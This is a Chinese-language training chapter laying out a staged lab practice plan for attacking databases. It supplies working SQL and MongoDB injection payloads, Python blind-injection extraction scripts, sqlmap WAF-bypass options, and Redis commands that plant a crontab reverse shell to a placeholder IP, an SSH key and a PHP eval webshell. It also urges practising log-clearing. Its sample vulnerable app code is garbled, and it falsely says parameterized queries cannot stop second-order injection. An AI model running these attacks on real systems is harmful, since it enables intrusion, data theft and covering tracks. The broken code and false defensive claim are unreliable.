## 练习建议

前七个实战案例覆盖了数据库安全攻防的核心场景——从基础的联合查询注入到复杂的二次注入、从关系型数据库到 NoSQL 数据库、从 SQL 注入到配置漏洞利用。本节将这些案例串联为一套系统化的练习框架，帮助你从"看懂案例"进阶到"独立发现和利用漏洞"。

### 练习环境搭建

在开始任何练习之前，你需要一个完整、隔离、可反复重置的实验环境。不要在生产机器或个人电脑上直接操作，使用虚拟机或容器是基本的安全规范。

#### 靶场环境清单

| 靶场 | 覆盖案例 | 部署方式 | 难度 |
|------|---------|---------|------|
| SQLi-labs | 案例一、二、五 | Docker 或 Apache + PHP | 入门→进阶 |
| DVWA | 综合 SQL 注入练习 | Docker | 入门 |
| PortSwigger Labs | 所有 Web 注入类型 | 在线（免费注册） | 入门→专家 |
| MongoDB + Node.js | 案例三、六 | Docker Compose | 中级 |
| Redis | 案例四、七 | Docker | 中级 |
| HackTheBox / TryHackMe | 综合渗透 | 在线平台 | 中级→高级 |

```javascript
const bodyParser = require('body-parser');

async function initDB() {

// 漏洞登录接口 —— 直接将用户输入传入 MongoDB 查询
app.post('/login', async (req, res) => {
  try {
    const user = await User.findOne(req.body);  // 漏洞点
    if (user) {
      res.json({ success: true, role: user.role, username: user.username });
    } else {
      res.json({ success: false, message: 'Invalid credentials' });
    }
  } catch (e) {
    res.status(500).json({ error: e.message });

});

// $where 注入接口
app.post('/search', async (req, res) => {
  try {
    const results = await User.find({ $where: req.body.query });  // 漏洞点
    res.json(results.map(u => ({ username: u.username, role: u.role })));
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.listen(3000, () => console.log('[*] VulnApp running on port 3000'));
```

### 分阶段练习路线

不要试图一次性掌握所有技术。按以下路线循序渐进，每个阶段完成后才进入下一阶段。

#### 第一阶段：基础注入（对应案例一）

**目标**：理解 SQL 注入的产生原理，能够手工构造 UNION 注入 payload。

**练习步骤**：

1. 打开 SQLi-labs Less-1，在浏览器地址栏测试 `?id=1`、`?id=1'`、`?id=1" `，观察返回差异
2. 用 `ORDER BY` 确定列数：`?id=1' ORDER BY 3--+`（逐步递增直到报错）
3. 用 `UNION SELECT` 确定回显位：`?id=-1' UNION SELECT 1,2,3--+`
4. 依次提取：当前数据库名 → 所有数据库名 → 表名 → 列名 → 数据

**关键 payload 模板**：

```sql
-- 提取当前数据库
?id=-1' UNION SELECT 1,database(),3--+

-- 提取所有表名
?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+

-- 提取 users 表的列名
?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--+

-- 提取用户名和密码
?id=-1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--+
```

**验收标准**：能够不查资料，从零开始在 10 分钟内完成一次完整的联合查询注入，拿到 admin 密码。

#### 第二阶段：盲注技术（对应案例二）

**目标**：掌握布尔盲注和时间盲注的原理，能编写自动化脚本。

**练习步骤**：

1. 在 SQLi-labs Less-8（布尔盲注）和 Less-9（时间盲注）上练习
2. 先手工发送 payload 理解判断逻辑，再编写 Python 脚本自动化
3. 对比"逐字符爆破"和"二分法"的效率差异

**布尔盲注脚本模板**：

```python
import requests

TARGET = "http://localhost:8080/Less-8/"
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@_{}-"

def inject_boolean(payload_template, position, char):
    """发送布尔盲注 payload，根据页面变化判断条件真假"""
    payload = payload_template.format(pos=position, char=char)
    url = f"{TARGET}?id={payload}"
    resp = requests.get(url, timeout=10)
    return "You are in" in resp.text

def extract_string(payload_template, max_len=50):
    """逐字符提取字符串"""
    result = ""
    for i in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            if inject_boolean(payload_template, i, ord(c)):
                result += c
                print(f"\r[+] Result: {result}", end="", flush=True)
                found = True
                break
        if not found:
            break
    print()
    return result

# 二分法版本 —— 效率提升 5-10 倍
def extract_string_binary(payload_template, max_len=50):
    result = ""
    for i in range(1, max_len + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            url = f"{TARGET}?id={payload_template.format(pos=i, mid=mid)}"
            if "You are in" in requests.get(url, timeout=10).text:
                low = mid + 1
            else:
                high = mid
        if low < 32:
            break
        result += chr(low)
        print(f"\r[+] Result: {result}", end="", flush=True)
    print()
    return result

# 提取当前数据库名
template = "-1' OR ASCII(SUBSTR(database(),{pos},1))>{mid}--+"
print("[*] Extracting current database...")
db_name = extract_string_binary(template)
print(f"[+] Database: {db_name}")
```

**时间盲注脚本核心逻辑**：

```python
import time

def inject_time(payload_template, position, char):
    """时间盲注：根据响应延迟判断"""
    payload = payload_template.format(pos=position, char=char)
    url = f"{TARGET}?id={payload}"
    start = time.time()
    requests.get(url, timeout=15)
    elapsed = time.time() - start
    return elapsed > 3  # SLEEP(3) 的阈值

# 时间盲注 payload 模板
template = "-1' OR IF(ASCII(SUBSTR(database(),{pos},1))={char},SLEEP(3),0)--+"
```

**验收标准**：能够独立编写二分法盲注脚本，在 Less-8 和 Less-9 上成功提取数据库名、表名和数据。脚本运行时间不超过 2 分钟完成一个数据库名的提取。

#### 第三阶段：报错注入与高级技巧（对应案例二补充）

**目标**：掌握 `extractvalue`、`updatexml`、`floor` 三种报错注入方式。

**练习要点**：

```sql
-- extractvalue 报错注入（MySQL 5.1+）
?id=-1' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+

-- updatexml 报错注入（MySQL 5.1+）
?id=-1' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+

-- floor 报错注入（MySQL 5.x 全版本）
?id=-1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(
  (SELECT database()),FLOOR(RAND(0)*2)
)x FROM information_schema.tables GROUP BY x)a)--+
```

**每种方式的适用场景**：

| 方法 | 适用版本 | 最大回显长度 | 适用场景 |
|------|---------|-------------|---------|
| extractvalue | MySQL 5.1+ | 32 字符 | 有报错回显的页面 |
| updatexml | MySQL 5.1+ | 32 字符 | 有报错回显的页面 |
| floor | MySQL 5.x | 不限（分多次） | 需要更长数据时 |

**验收标准**：能够根据目标环境选择最合适的报错注入方式，并理解每种方式为什么会产生报错（XML 解析错误、GROUP BY 重复键）。

#### 第四阶段：NoSQL 注入（对应案例三、六）

**目标**：掌握 MongoDB 操作符注入和 `$where` JavaScript 注入，理解 NoSQL 注入与 SQL 注入的本质区别。

**练习任务**：

**任务 1 —— 认证绕过**（对应案例三 MongoDB 注入绕过认证）：

```bash
# 正常登录
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"SuperSecret@2026"}'

# 绕过认证 —— 使用 $ne 操作符
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# 绕过认证 —— 使用 $gt 操作符
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'

# 绕过认证 —— 使用 $regex 操作符
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":".*"}}'
```

**任务 2 —— $where JavaScript 注入**：

```bash
# 利用 $where 执行 JavaScript
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -d '{"query":"1==1"}'

# 逐字符爆破密码
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -d '{"query":"this.password.charAt(0)===\"S\""}'
```

**任务 3 —— 未授权访问利用**（对应案例六 MongoDB 未授权访问）：

```bash
# 检测是否开启认证
mongosh --host localhost --eval "db.adminCommand('listDatabases')"

# 导出所有数据库
mongodump --host localhost --out /tmp/mongo_dump

# 查看敏感集合
mongosh --host localhost --eval "
  use admin;
  db.getCollectionNames().forEach(function(c) {
    print('Collection: ' + c);
    db[c].find().limit(5).forEach(printjson);
  });
"
```

**验收标准**：能够在不知道密码的情况下通过操作符注入登录系统，能够利用 `$where` 注入逐字符提取数据，能够利用未授权访问导出整个数据库。

#### 第五阶段：Redis 攻击（对应案例四、七）

**目标**：掌握 Redis 未授权访问的完整攻击链——从信息收集到写入 WebShell 拿下服务器。

**练习任务**：

```bash
# 步骤 1：信息收集
redis-cli -h 127.0.0.1 INFO
redis-cli -h 127.0.0.1 CONFIG GET *

# 步骤 2：写入 crontab 反弹 shell（Linux）
redis-cli -h 127.0.0.1 <<EOF
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SET x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\n\n"
SAVE
EOF

# 步骤 3：写入 SSH 公钥
redis-cli -h 127.0.0.1 <<EOF
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAAB3...your_public_key...\n\n"
SAVE
EOF

# 步骤 4：写入 WebShell（对应案例七）
redis-cli -h 127.0.0.1 <<EOF
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php eval(\$_POST['cmd']); ?>"
SAVE
EOF
```

**安全提醒**：以上操作仅限在自己搭建的 Docker 容器中练习。对未授权的服务器执行上述操作属于违法行为。

**验收标准**：能够在 Redis 未授权访问的前提下，至少成功实现一种攻击方式（crontab 反弹 shell / SSH 公钥 / WebShell），并理解每种方式的前置条件（目录权限、操作系统类型）。

#### 第六阶段：二次注入（对应案例五）

**目标**：理解"先存储、后触发"的二次注入机制，这是难度最高的 SQL 注入类型之一。

**练习思路**：

二次注入的核心在于：应用对用户输入做了转义存储，但在后续使用存储数据时未再次过滤。你需要找到"写入"和"读取"两个不同的功能点。

```text
写入阶段（注册/修改密码）：
  用户输入: admin'-- 
  数据库存储: admin'--  （转义后存储，此时无害）

读取阶段（修改密码功能）：
  SQL: UPDATE users SET password='new_pass' WHERE username='admin'--'
  实际效果: admin 用户的密码被修改为 new_pass
```

**练习方法**：

1. 在 SQLi-labs 的二次注入关卡中注册一个用户名包含 `'--` 的账号
2. 使用该账号登录，触发修改密码功能
3. 观察 SQL 语句拼接后的实际效果
4. 尝试构造更复杂的 payload，如 `admin' UNION SELECT ...--`

**验收标准**：能够独立设计二次注入的攻击流程，理解为什么参数化查询无法防御二次注入（因为攻击 payload 在存储时已经被"安全"处理了）。

### 工具链练习

实战中你不会只用手工注入，以下工具链必须熟练掌握。

#### sqlmap 深度练习

sqlmap 是自动化 SQL 注入的行业标准工具，但大多数人只会 `sqlmap -u "url"` 。你需要掌握以下高级用法：

```bash
# 1. 自定义请求头（Cookie 注入）
sqlmap -u "http://target/page?id=1" \
  --cookie="session=abc123" \
  --level=2 --risk=2

# 2. POST 请求注入
sqlmap -u "http://target/login" \
  --data="username=admin&password=123" \
  -p username

# 3. 使用自定义 tamper 脚本绕过 WAF
sqlmap -u "http://target/page?id=1" \
  --tamper=space2comment,between,randomcase \
  --random-agent

# 4. 绕过 CSRF token
sqlmap -u "http://target/page?id=1" \
  --csrf-token="csrf_token" \
  --csrf-url="http://target/form"

# 5. 优化速度（大批量数据提取）
sqlmap -u "http://target/page?id=1" \
  --dump -T users -D mydb \
  --threads=10 \
  --predict-output

# 6. 与 Burp Suite 联动
# 先在 Burp 中抓取请求，保存为 request.txt
sqlmap -r request.txt --batch --dbs
```

**练习要点**：在 SQLi-labs 上对比手工注入和 sqlmap 的效率差异。理解 sqlmap 的检测原理（基于布尔差异、时间延迟、报错信息），而不是把它当黑盒使用。

#### Burp Suite 辅助注入

```text
1. 配置浏览器代理 → 127.0.0.1:8080
2. 拦截目标请求，发送到 Repeater
3. 在 Repeater 中手动修改参数测试注入点
4. 使用 Intruder 模块进行自动化爆破：
   - 标记注入位置为 §
   - 选择 Sniper / Cluster Bomb 攻击模式
   - 导入 Payload 字典
5. 使用 Decoder 模块编码特殊字符（URL编码、Base64、Hex）
```

| 能力维度 | 入门（能做） | 中级（熟练） | 高级（精通） |
|---------|------------|------------|------------|
| SQL 注入发现 | 手工测试单个参数 | 半自动化扫描整站 | 审计代码定位注入点 |

| 工具使用 | sqlmap 基本用法 | 自定义 tamper | 工具源码级定制 |

#### 综合挑战

当你认为自己已经准备好时，尝试以下综合挑战：

**挑战 1 —— 端到端渗透**：

在 HackTheBox 或 TryHackMe 上选择一台包含数据库漏洞的靶机，完整走完以下流程：

```text
信息收集 → 端口扫描 → Web 枚举 → 漏洞发现 → 漏洞利用 → 权限提升 → 数据提取
```

**挑战 2 —— 安全审计**：

找一个开源的 CMS 或 Web 应用（如 WordPress 插件、PHP 应用），对其数据库交互代码进行安全审计，尝试发现未被公开报告的注入漏洞。这不是为了提交漏洞，而是训练你"从代码层面理解漏洞成因"的能力。

**挑战 3 —— 防御实战**：

用 PHP 或 Python 写一个带有"故意漏洞"的登录系统，然后：

1. 自己攻击它，找到所有注入点
2. 用参数化查询修复所有漏洞
3. 再次攻击，验证修复是否有效
4. 记录修复前后的行为差异

这个"攻→防→验证"的闭环能让你真正理解防御措施为什么有效。

### 常见练习误区

在练习过程中，以下几个错误会导致你"练了等于没练"：

**误区 1：只用 sqlmap，不学手工注入**

sqlmap 是工具，手工注入是能力。如果你只会用 sqlmap，遇到 WAF 或自定义过滤器就束手无策。正确的做法是：先用手工注入理解原理，再用 sqlmap 提高效率。

**误区 2：只练成功路径，不试失败情况**

真正的渗透中，90% 的尝试是失败的。你应该练习：当 UNION 被过滤时怎么办？当 `SLEEP()` 被禁用时怎么办？当回显被编码时怎么办？处理失败情况的能力才是实战能力。

**误区 3：背 payload 而不理解原理**

`UNION SELECT 1,2,3` 为什么能工作？`extractvalue` 为什么会报错？`$ne` 为什么能绕过认证？如果你不能解释这些 payload 的底层逻辑，换个环境你就会不知所措。

**误区 4：忽视清理痕迹**

练习时不需要清理，但实战中这是生死攸关的能力。养成好习惯：每次练习结束后，清理日志、删除写入的文件、恢复修改的配置。这不仅是为了练习清理技术，也是为了让你理解"攻击者会留下哪些痕迹"——反过来就是防御者的检测思路。

**误区 5：只关注 SQL 注入，忽视其他数据库漏洞**

本章的案例不止 SQL 注入，还有 MongoDB 注入、Redis 未授权访问、配置漏洞。现实中，NoSQL 数据库的安全问题同样严重，而且由于开发者对 NoSQL 的安全意识更薄弱，这类漏洞往往更容易被忽视。

### 持续精进建议

数据库安全是一个快速演变的领域。新的数据库引擎、新的防御机制、新的绕过技术不断出现。以下是保持竞争力的长期策略：

**建立自己的 Payload 字典**：每次练习或 CTF 中遇到有效的 payload，分类记录到文件中。按数据库类型（MySQL/PostgreSQL/MongoDB/Redis）、注入类型（联合查询/盲注/报错/堆叠）和绕过目标（WAF/过滤器/编码）组织。半年后你会拥有一份远超任何公开字典的个人武器库。

**关注安全社区动态**：关注 [PortSwigger Research](https://portswigger.net/research)、[OWASP](https://owasp.org/)、[HackTricks](https://book.hacktricks.wiki/) 等资源。数据库安全的新突破往往先出现在这些平台上。

**定期参加 CTF 比赛**：CTF 中的 Web 类题目经常涉及数据库注入的变种。推荐平台：[CTFtime](https://ctftime.org/)（赛事日历）、[BUUCTF](https://www.buuctf.com/)（国内平台）、[PicoCTF](https://picoctf.org/)（入门友好）。

**做防御方的练习**：真正的安全专家不仅要会攻击，还要会防御。尝试为一个 Web 应用编写完整的数据库安全防护方案：参数化查询、输入验证、最小权限、审计日志、WAF 规则。能攻能防才是完整的能力闭环。
